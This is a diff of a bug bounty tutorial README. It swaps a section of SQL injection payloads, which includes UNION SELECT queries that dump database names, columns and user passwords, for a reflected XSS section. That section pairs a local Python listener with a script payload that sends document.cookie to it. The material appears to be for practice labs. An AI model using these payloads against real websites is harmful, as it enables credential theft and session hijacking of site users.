@@ -1,13 +1,10 @@
 # bug-bounty-tutorial
 bug bounty tutorial
 
-## 3.intro bug bounty
+## 17.XSS-(Reflected)
+
+### low
 ```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
-
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
-
-1' OR 1=1 UNION SELECT user, password FROM users #
+python3 -m http.server 1337
+<script>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
 ```
